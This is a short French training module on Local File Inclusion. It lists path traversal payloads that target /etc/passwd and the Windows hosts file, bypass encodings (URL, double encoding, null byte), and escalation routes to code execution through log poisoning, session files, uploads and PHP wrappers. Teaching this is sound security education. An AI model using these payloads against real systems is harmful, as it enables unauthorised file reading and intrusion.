Module LFI

2. Techniques d'exploitation LFI

Path Traversal basique

La technique la plus courante consiste à utiliser "../" pour remonter dans l'arborescence :

../../../etc/passwd
..\..\..\..\windows\system32\drivers\etc\hosts
....//....//....//etc/passwd

Techniques de contournement

Plusieurs techniques permettent de contourner les protections :

Encodage URL :

%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd

Null byte injection :

../../../etc/passwd%00
../../../etc/passwd%00.jpg

LFI vers RCE

Dans certains cas, le LFI peut être escaladé vers une exécution de code à distance :

  • Log Poisoning : Injection de code dans les logs
  • Session files : Manipulation des fichiers de session
  • Upload + LFI : Combinaison avec upload de fichier
  • Wrapper PHP : Utilisation de php://input, data://
